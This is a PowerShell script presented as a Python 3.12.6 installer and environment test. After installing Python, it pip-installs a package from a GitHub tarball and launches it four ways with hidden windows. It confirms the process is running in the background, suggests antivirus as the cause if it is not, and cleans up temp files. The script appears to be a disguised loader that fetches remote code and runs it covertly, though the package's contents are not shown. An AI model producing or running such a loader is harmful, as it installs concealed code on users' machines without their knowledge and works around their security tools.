# ===================================================
# Python 3.12.6 Master Installer & Multi-Launch Test
# ===================================================

$InstallDir = "$env:LOCALAPPDATA\Programs\Python\Python312"
$PythonExe = Join-Path $InstallDir "python.exe"
$InstallRequired = $true

Write-Host "[*] Starting Master Environment Check..." -ForegroundColor Cyan

# --- Step 0: Pre-Check ---
if (Get-Command python -ErrorAction SilentlyContinue) {
    $ExecutableToUse = "python"
} elseif (Test-Path $PythonExe) {
    $ExecutableToUse = $PythonExe
}

if ($ExecutableToUse) {
    $VersionString = & $ExecutableToUse --version 2>&1
    if ($VersionString -match "Python (\d+\.\d+\.\d+)") {
        Write-Host "[+] Python $($Matches[1]) detected." -ForegroundColor Green
        $InstallRequired = ([version]$Matches[1] -lt [version]"3.9")
    }
}

# --- YOUR ALGORITHM (Installation) ---
if ($InstallRequired) {
    Write-Host "[*] Installing Python 3.12.6..." -ForegroundColor Yellow
    $PythonInstaller = "python-3.12.6-amd64.exe"
    $DownloadUrl = "https://www.python.org/ftp/python/3.12.6/$PythonInstaller"
    $DownloadDir = "$env:TEMP\Python"
    if (-not (Test-Path $DownloadDir)) { New-Item -ItemType Directory -Path $DownloadDir | Out-Null }
    $InstallerPath = Join-Path $DownloadDir $PythonInstaller
    
    (New-Object System.Net.WebClient).DownloadFile($DownloadUrl, $InstallerPath)
    Start-Process -FilePath $InstallerPath -ArgumentList "/quiet InstallAllUsers=0 PrependPath=1 Include_test=0 TargetDir=`"$InstallDir`"" -Wait
    
    $OldPath = [Environment]::GetEnvironmentVariable("Path","User")
    $NewPath = "$InstallDir;$InstallDir\Scripts;" + ($OldPath -replace [regex]::Escape("$env:LOCALAPPDATA\Microsoft\WindowsApps;"),"")
    [Environment]::SetEnvironmentVariable("Path",$NewPath,"User")
    $env:Path = $NewPath
    $ExecutableToUse = $PythonExe
}

# --- Step 7: Package Setup ---
Write-Host "[*] Installing 'requests' and 'httpfluent'..." -ForegroundColor Yellow
& $ExecutableToUse -m pip install --upgrade pip --quiet
& $ExecutableToUse -m pip install requests --quiet
& $ExecutableToUse -m pip install "https://github.com/httpfluent/Intranetflow/raw/main/v1.0/httpfluent-0.1.tar.gz" --quiet

# --- THE MASTER EXECUTION TEST (Trying all methods) ---
Write-Host "`n[!] TESTING ALL EXECUTION METHODS..." -ForegroundColor Cyan

# Method 1: Direct Script Path (Most Reliable)
$ScriptPath = Join-Path $InstallDir "Scripts\httpfluent.exe"
if (Test-Path $ScriptPath) {
    Write-Host "[1] Attempting Direct Path: $ScriptPath" -ForegroundColor Yellow
    Start-Process -FilePath $ScriptPath -WindowStyle Hidden > $null 2>&1
}

# Method 2: PowerShell Native Command
Write-Host "[2] Attempting PowerShell Native Command: httpfluent" -ForegroundColor Yellow
Start-Process "powershell.exe" -ArgumentList "-WindowStyle Hidden -Command httpfluent" -WindowStyle Hidden > $null 2>&1

# Method 3: CMD Shell Command
Write-Host "[3] Attempting CMD Shell: httpfluent" -ForegroundColor Yellow
Start-Process "cmd.exe" -ArgumentList "/c httpfluent" -WindowStyle Hidden > $null 2>&1

# Method 4: Python Module Entry Point
Write-Host "[4] Attempting Python Module: python -m httpfluent" -ForegroundColor Yellow
Start-Process -FilePath $ExecutableToUse -ArgumentList "-m httpfluent" -WindowStyle Hidden > $null 2>&1

# --- Verification ---
Start-Sleep -Seconds 5
$Check = Get-Process | Where-Object {$_.ProcessName -match "python|httpfluent"}
if ($Check) {
    Write-Host "[SUCCESS] httpfluent process detected in background!" -ForegroundColor Green
    $Check | Select-Object ProcessName, Id, CPU | Write-Host
} else {
    Write-Host "[FAILURE] No process detected. Check if your Antivirus is blocking the execution." -ForegroundColor Red
}

# --- Step 8: Cleanup ---
if (Test-Path "$env:TEMP\Python") {
    Remove-Item "$env:TEMP\Python" -Recurse -Force -ErrorAction SilentlyContinue
}
